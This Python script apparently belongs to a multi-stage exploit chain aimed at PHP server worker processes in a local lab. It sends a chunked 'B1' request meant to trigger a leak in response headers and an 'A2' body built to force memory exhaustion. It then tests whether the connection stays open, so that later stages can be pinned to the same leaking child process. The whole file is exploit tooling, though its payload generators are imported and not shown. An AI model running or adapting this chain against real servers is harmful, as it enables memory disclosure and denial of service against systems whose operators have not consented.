#!/usr/bin/env python3
"""Solo connection-survival probe for B1 and A2 on the multi-worker lab.

A1 already closes the connection (HTTP/1.0 500, Connection: close). This
script tests whether B1 and A2, sent with Connection: keep-alive, keep the
connection open for a following GET /pid.php. That determines whether a
hybrid chain can pin A2/B2 to the child that produced the B1 leak.

usage:
  python3 solo_probe.py --port 18112 --stage b1
  python3 solo_probe.py --port 18112 --stage a2
"""
from __future__ import annotations

import argparse
import os
import socket
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
sys.path.insert(0, os.path.join(os.path.dirname(HERE), "payloads"))

import keepalive_probe as k  # type: ignore


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18112)
    ap.add_argument("--stage", choices=["b1", "a2"], required=True)
    args = ap.parse_args()

    s = socket.create_connection((args.host, args.port), timeout=120)
    buf = b""
    try:
        if args.stage == "b1":
            body = k.generate_b1("/tmp")
            print("B1 body bytes:", len(body))
            k.send_chunked(s, args.host, args.port, "/index.php", body)
            st, hd, bd, buf = k.read_response(s, buf, timeout=180)
            k.describe("B1", (st, hd, bd, buf))
            leak = k.parse_leak(hd)
            print("B1 leak:", "yes" if leak else "no")
        else:
            from cheap_oom_a import build_body
            body = build_body(880, 64, 115, b"a" * 32, b"k0", k.BOUNDARY)
            print("A2 body bytes:", len(body))
            k.send_plain(s, args.host, args.port, "/index.php", body)
            st, hd, bd, buf = k.read_response(s, buf, timeout=180)
            k.describe("A2", (st, hd, bd, buf))

        pid, buf = k.get_pid(s, buf, args.host, args.port)
        print("%s socket survived; pid after %s: %s"
              % (args.stage.upper(), args.stage.upper(), pid))
    except Exception as exc:
        print("%s socket did not survive: %r" % (args.stage.upper(), exc))
        s.close()
        return 0
    s.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
